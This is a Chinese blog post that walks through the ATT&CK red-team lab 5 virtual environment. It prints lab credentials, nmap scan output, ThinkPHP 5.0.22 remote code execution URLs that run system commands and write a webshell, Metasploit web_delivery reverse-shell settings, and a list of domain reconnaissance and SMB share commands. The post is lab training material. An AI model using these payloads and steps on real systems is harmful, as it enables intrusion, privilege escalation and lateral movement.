@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>ATT&amp;CK红队评估实战靶场五 | 子夜旅馆</title>
+  <meta name="keywords" content=" 靶场 ">
+  <meta name="description" content="ATT&amp;CK红队评估实战靶场五 | 子夜旅馆">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="子夜旅馆">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="https://sunwu57.github.io/about/index.html">
+<meta property="og:site_name" content="子夜旅馆">
+<meta property="og:description" content="子夜旅馆">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-24T13:10:23.000Z">
+<meta property="article:modified_time" content="2023-03-24T13:10:23.260Z">
+<meta property="article:author" content="ziyebuku">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/bikabika.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/bikabika.jpg"/>
+</a>
+<div class="author">
+    <span>ziyebuku</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/sunwu57"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            <a title="instagram"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-instagram"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            <a title="zhihu"
+               href="https://www.zhihu.com/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-zhihu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="oschina"
+               href="https://my.oschina.net/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-oschina"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="email"
+               href="mailto:1210396142@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=1210396142&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+    <a class="more-menus">更多菜单</a>
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(22)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="杂文">
+                        
+                        杂文
+                        <small>(12)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="web">
+                        
+                        web
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="红队">
+                        
+                        红队
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="渗透">
+                        
+                        渗透
+                        <small>(4)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+                <a class="dynamic-menu "
+                   target="_self"
+                   
+                   href="http://DeelMind.com/">DeelMind</a>
+        
+            
+                <a class="dynamic-menu "
+                   target="_self"
+                   
+                   href="http://sunwu.world/">子夜旅馆</a>
+        
+            
+                <a class="dynamic-menu "
+                   target="_blank"
+                        
+                   href="http://pan.sunwu.world/">子夜旅馆的网盘</a>
+        
+            
+                <a class="dynamic-menu "
+                   target="_blank"
+                        
+                   href="https://github.com/sunwu57">github</a>
+        
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="22">
+<input type="hidden" id="yelog_site_word_count" value="32.9k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://sunwu.world/">子夜旅馆</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>靶场</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>服务器</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>格言</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>护网</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>免杀</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>权限维持</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>群晖</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>bing</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>blog</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>C#</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>C++</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>chatGPT</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>go</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>hexo</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>hw</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>markdown</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>mysql</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>typora</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a id="top" class="全部文章 杂文 "
+           href="/2023/05/21/c5373bf7dfceca4cdcc33fad1df55971/"
+           data-tag="mysql"
+           data-author="" >
+            <span class="post-title" title="mysql安装">mysql安装</span>
+            <span class="post-date" title="2023-05-21 21:48:56">2023/05/21</span>
+        </a>
+        
+        
+        <a id="top" class="全部文章 红队 "
+           href="/2023/05/13/25a11d033e6d17f3cbcb17ad86cfbeca/"
+           data-tag="免杀,go,C++,C#"
+           data-author="" >
+            <span class="post-title" title="免杀第二课">免杀第二课</span>
+            <span class="post-date" title="2023-05-13 16:21:12">2023/05/13</span>
+        </a>
+        
+        
+        <a id="top" class="全部文章 红队 "
+           href="/2023/05/10/b538ee95b1220b081f05a6a765f9a5d6/"
+           data-tag="免杀,go"
+           data-author="" >
+            <span class="post-title" title="免杀第一课">免杀第一课</span>
+            <span class="post-date" title="2023-05-10 05:14:38">2023/05/10</span>
+        </a>
+        
+        
+        <a id="top" class="全部文章 杂文 "
+           href="/2023/05/09/eafa2a02780689b003b43a295b1f2b03/"
+           data-tag="服务器"
+           data-author="" >
+            <span class="post-title" title="第一个服务器">第一个服务器</span>
+            <span class="post-date" title="2023-05-09 20:34:08">2023/05/09</span>
+        </a>
+        
+        
+        <a id="top" class="全部文章 杂文 "
+           href="/2023/05/07/fe2173563cec9d3985c171f02b404c10/"
+           data-tag="群晖"
+           data-author="" >
+            <span class="post-title" title="群晖进行DDNS解析">群晖进行DDNS解析</span>
+            <span class="post-date" title="2023-05-07 21:18:57">2023/05/07</span>
+        </a>
+        
+        
+        <a id="top" class="全部文章 杂文 "
+           href="/2023/04/13/17f4ffd9d8dc51fe7b6c56dbb086537c/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="hackerone挖洞之旅">hackerone挖洞之旅</span>
+            <span class="post-date" title="2023-04-13 14:34:37">2023/04/13</span>
+        </a>
+        
+        
+        <a id="top" class="全部文章 杂文 "
+           href="/2023/04/10/8b178aab5fb2c31b010a6823e06b9a9f/"
+           data-tag="护网,hw"
+           data-author="" >
+            <span class="post-title" title="2023年护网题库">2023年护网题库</span>
+            <span class="post-date" title="2023-04-10 15:38:32">2023/04/10</span>
+        </a>
+        
+        
+        <a id="top" class="全部文章 渗透 "
+           href="/2023/03/29/7748c26040f4491c2f809db2a2412ab9/"
+           data-tag="靶场"
+           data-author="" >
+            <span class="post-title" title="ATT&amp;CK红队评估实战靶场五">ATT&amp;CK红队评估实战靶场五</span>
+            <span class="post-date" title="2023-03-29 20:24:27">2023/03/29</span>
+        </a>
+        
+        
+        <a id="top" class="全部文章 杂文 "
+           href="/2023/03/28/6d7f1dc9d7872147f098c3da194f6a5e/"
+           data-tag="格言"
+           data-author="" >
+            <span class="post-title" title="格言">格言</span>
+            <span class="post-date" title="2023-03-28 10:17:45">2023/03/28</span>
+        </a>
+        
+        
+        <a id="top" class="全部文章 杂文 "
+           href="/2023/03/26/0702f5e2fee312a06ed96d135a8eb292/"
+           data-tag="hexo"
+           data-author="" >
+            <span class="post-title" title="利用github搭建hexo博客~">利用github搭建hexo博客~</span>
+            <span class="post-date" title="2023-03-26 23:58:54">2023/03/26</span>
+        </a>
+        
+        
+        <a id="top" class="全部文章 杂文 "
+           href="/2023/03/25/cc6cb6af50f74808fa4e0c665f87159a/"
+           data-tag="markdown,typora"
+           data-author="" >
+            <span class="post-title" title="markdown语法">markdown语法</span>
+            <span class="post-date" title="2023-03-25 10:50:49">2023/03/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/12/03/ktlz2f4rgb1x5zyv/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Typora">Typora</span>
+            <span class="post-date" title="2023-12-03 19:06:35">2023/12/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/12/03/740fe2532e1572a5acbf74eeac53397c/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="人性的弱点">人性的弱点</span>
+            <span class="post-date" title="2023-12-03 17:14:55">2023/12/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/12/03/bsxftx0tg362oxig/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="hexo+语雀">hexo+语雀</span>
+            <span class="post-date" title="2023-12-03 11:34:03">2023/12/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 杂文 "
+           href="/2023/05/02/bc70e70cfce286a2a3f66f1f7d0e02ed/"
+           data-tag="chatGPT"
+           data-author="" >
+            <span class="post-title" title="使用chatGPT写论文的方法">使用chatGPT写论文的方法</span>
+            <span class="post-date" title="2023-05-02 15:44:22">2023/05/02</span>
+        </a>
+        
+        
+        <a  class="全部文章 渗透 "
+           href="/2023/03/30/7b753d1f0ef5464a54b353ec9c57e36b/"
+           data-tag="靶场"
+           data-author="" >
+            <span class="post-title" title="ATT&amp;CK红队评估实战靶场二">ATT&amp;CK红队评估实战靶场二</span>
+            <span class="post-date" title="2023-03-30 14:36:43">2023/03/30</span>
+        </a>
+        
+        
+        <a  class="全部文章 渗透 "
+           href="/2023/03/30/d70a73ac5cc0a2f8407c443b2c95f787/"
+           data-tag="靶场"
+           data-author="" >
+            <span class="post-title" title="ATT&amp;CK红队评估实战靶场一">ATT&amp;CK红队评估实战靶场一</span>
+            <span class="post-date" title="2023-03-30 14:34:52">2023/03/30</span>
+        </a>
+        
+        
+        <a  class="全部文章 杂文 "
+           href="/2023/03/29/7d50696487c73ca99c968c9c9955a043/"
+           data-tag="markdown"
+           data-author="" >
+            <span class="post-title" title="markdown代码段折叠语法">markdown代码段折叠语法</span>
+            <span class="post-date" title="2023-03-29 18:34:09">2023/03/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 渗透 "
+           href="/2023/03/29/ea07962bb935eb90f975ba42cdf7adb2/"
+           data-tag="靶场"
+           data-author="" >
+            <span class="post-title" title="vulnhub-FOWSNIFF靶机">vulnhub-FOWSNIFF靶机</span>
+            <span class="post-date" title="2023-03-29 18:14:04">2023/03/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 杂文 "
+           href="/2023/03/27/76cf879ecc21821cb10b3bcbcb825a7e/"
+           data-tag="bing"
+           data-author="" >
+            <span class="post-title" title="百分百进行new bing聊天，跳过候补名单">百分百进行new bing聊天，跳过候补名单</span>
+            <span class="post-date" title="2023-03-27 15:16:00">2023/03/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 web "
+           href="/2023/03/25/f3cb198a616acdd56f37f305ce6c228c/"
+           data-tag="权限维持"
+           data-author="" >
+            <span class="post-title" title="权限维持">权限维持</span>
+            <span class="post-date" title="2023-03-25 16:39:15">2023/03/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 杂文 "
+           href="/2023/03/23/bcdbcbb3872aaa2bba70f16be2c31093/"
+           data-tag="blog"
+           data-author="" >
+            <span class="post-title" title="typora+PicGo+LskyPro+Obsidian实现文章管理">typora+PicGo+LskyPro+Obsidian实现文章管理</span>
+            <span class="post-date" title="2023-03-23 22:37:16">2023/03/23</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-7748c26040f4491c2f809db2a2412ab9" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">ATT&amp;CK红队评估实战靶场五</h1>
+    
+    <div class="article-meta">
+        
+        <span class="top"><a>置顶</a></span>
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="渗透">渗透</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color3">靶场</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2024-07-10 19:50:57'>2023-03-29 20:24</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:1.2k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303292025019.jpeg#alt=img"></p>
+<ol>
+<li><p> 环境信息</p>
+</li>
+<li><ol>
+<li> kali</li>
+</ol>
+</li>
+<li><ol>
+<li><ol>
+<li>vm8:192.168.135.128</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><ol>
+<li> win7</li>
+</ol>
+</li>
+<li><ol>
+<li><ol>
+<li>vm8:192.168.135.150</li>
+<li>vm1:192.168.138.136</li>
+<li>sun\heart 123.com</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<p>sun\Administrator dc123.com 6.</p>
+<ol>
+<li><p>win2008-DC</p>
+</li>
+<li><ol>
+<li><ol>
+<li>vm1:192.168.138.138</li>
+<li>sun\admin 2020.com</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>环境配置</p>
+</li>
+<li><ol>
+<li>win7 上 sun\Administrator dc123.com 登录打开 phpstudy，并关闭防火墙</li>
+</ol>
+</li>
+<li><p>主机发现</p>
+</li>
+</ol>
+<p>6.</p>
+<ol start="7">
+<li>nmap -sP -T5 -f 192.168.135.1/24</li>
+<li>arp-scan -l</li>
+<li>masscan  –ports 22,80,443 –ping –open-only –range 192.168.135.1/24  –rate 1000000000000</li>
+<li>探测到目标主机 ip 为 192.168.135.150</li>
+<li>端口扫描</li>
+</ol>
+<p>12.</p>
+<ol start="13">
+<li>nmap -A -f -sV -p- 192.168.135.150</li>
+</ol>
+<pre><code class="go">PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38
+|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: SUN)
+3306/tcp  open  mysql        MySQL (unauthorized)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49384/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 00:0C:29:B1:0A:AF (VMware)
+Device type: general purpose
+Running: Microsoft Windows 7|2008|8.1
+OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
+Network Distance: 1 hop
+Service Info: Host: WIN7; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s
+| smb2-security-mode:
+|   2.1:
+|_    Message signing enabled but not required
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: WIN7, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b1:0a:af (VMware)
+| smb-os-discovery:
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: win7
+|   NetBIOS computer name: WIN7\x00
+|   Domain name: sun.com
+|   Forest name: sun.com
+|   FQDN: win7.sun.com
+|_  System time: 2022-05-13T08:48:04+08:00
+| smb2-time:
+|   date: 2022-05-13T00:48:05
+|_  start_date: 2022-05-12T11:19:12
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.77 ms 192.168.135.150
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 88.05 seconds
+</code></pre>
+<ol>
+<li><ol>
+<li> ？？？咋这么多端口……</li>
+</ol>
+</li>
+<li><p> web 信息收集</p>
+</li>
+<li><ol>
+<li> 目录扫描</li>
+</ol>
+</li>
+<li><ol>
+<li><ol>
+<li>dirsearch -u <a target="_blank" rel="noopener" href="http://192.168.135.150/">http://192.168.135.150</a> -r -x 302,404,403 -t 128</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<p>发现 add.php,乍一看像是不知道密码的 webshell 2. <a target="_blank" rel="noopener" href="http://192.168.135.150/123%E8%AE%BF%E9%97%AE%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E7%88%86%E5%87%BA%E7%89%88%E6%9C%ACThinkphp">http://192.168.135.150/123访问不存在的目录，爆出版本Thinkphp</a> V5.0.22 5.</p>
+<ol>
+<li> searchsploit  thinkphp</li>
+</ol>
+<p>locate 46150.txt</p>
+<p>cp /usr/share/exploitdb/exploits/php/webapps/46150.txt    ./</p>
+<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303292026675.png#alt=img"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.135.150/to/thinkphp_5.0.22/?s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=1%E6%88%90%E5%8A%9F%E8%A7%A6%E5%8F%91phpinfo%E6%BC%8F%E6%B4%9E">http://192.168.135.150/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1成功触发phpinfo漏洞</a> 6.<br>webshell 上传</p>
+<ol start="7">
+<li><ol>
+<li> <a target="_blank" rel="noopener" href="http://192.168.135.150/to/thinkphp_5.0.22/?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=dir">http://192.168.135.150/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</a></li>
+<li> <a target="_blank" rel="noopener" href="http://192.168.135.150/to/thinkphp_5.0.22/?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo">http://192.168.135.150/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo</a> “” &gt; shell.php</li>
+<li> 蚁剑连接</li>
+</ol>
+</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://192.168.135.150/shell.php">http://192.168.135.150/shell.php</a> 4. 看一下刚刚的 add.php</p>
+<p>$password = “2aefc34200a294a3cc7db81b43a81873”; //Viv, bebegim..</p>
+<p>admins 8.<br>msf 上线</p>
+<ol start="9">
+<li><ol>
+<li> use exploit/multi/script/web_delivery</li>
+</ol>
+</li>
+</ol>
+<p>set target 2    # 选择使用 powershell 类型的 payload</p>
+<p>set payload windows/meterpreter/reverse_tcp</p>
+<p>set lhost 192.168.135.128</p>
+<p>exploit 2. 蚁剑运行，msf 上线 3. getsystem</p>
+<p>获得 system 权限 10.<br>CS 上线</p>
+<p>11.</p>
+<ol>
+<li> <img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303292026284.png#alt=img"></li>
+<li> 内网信息收集</li>
+</ol>
+<pre><code class="go">ipconfig /all   # 查看本机ip，所在域
+route print     # 打印路由信息
+net view        # 查看局域网内其他主机名
+arp -a          # 查看arp缓存
+net start       # 查看开启了哪些服务
+net share       # 查看开启了哪些共享
+net share ipc$  # 开启ipc共享
+net share c$    # 开启c盘共享
+net use \\192.168.xx.xx\ipc$ &quot;&quot; /user:&quot;&quot;    # 与192.168.xx.xx建立空连接
+net use \\192.168.xx.xx\c$ &quot;密码&quot; /user:&quot;用户名&quot;    # 建立c盘共享
+dir \\192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目录下的文件
+
+net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
+net user                 # 查看本机用户列表
+net user /domain         # 查看域用户
+net localgroup administrators    # 查看本地管理员组（通常会有域用户）
+net view /domain         # 查看有几个域
+net user 用户名 /domain   # 获取指定域用户的信息
+net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
+net group 组名 /domain    # 查看域中某工作组
+net time /domain           // 主域服务器会同时作为时间服务器
+net group &quot;domain admins&quot; /domain  # 查看域管理员的名字
+net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名
+net group &quot;doamin controllers&quot; /domain  # 查看域控制器（可能有多台）
+net group &quot;Enterprise Admins&quot; /domain    // 查看域管理员组
+</code></pre>
+<ol>
+<li><ol>
+<li> 内网网段 138 段，域为 sun.com，以及一台域控 DC，IP 为 192.168.138.138</li>
+</ol>
+</li>
+<li><p> 建立监听，网络扫描，psexec64，然后就日穿了……</p>
+</li>
+<li><p> 参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/116132168">1</a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42094992/article/details/117390965">2</a><a target="_blank" rel="noopener" href="https://blog.csdn.net/BuNahua/article/details/120098504">3</a></p>
+</li>
+</ol>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1210396142@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>ATT&amp;CK红队评估实战靶场五</p>
+    <p><span class="copy-title">字数:</span><span class="post-count">1.2k</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="ziyebuku">ziyebuku</a></p>
+    <p><span class="copy-title">发布时间:</span>2023-03-29, 20:24:27</p>
+    <p><span class="copy-title">最后更新:</span>2024-07-10, 19:50:57</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2023/03/29/7748c26040f4491c2f809db2a2412ab9/" title="ATT&amp;CK红队评估实战靶场五">https://sunwu57.github.io/2023/03/29/7748c26040f4491c2f809db2a2412ab9/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#34;署名-非商用-相同方式共享 4.0&#34;</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2016-2025 ziyebuku
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
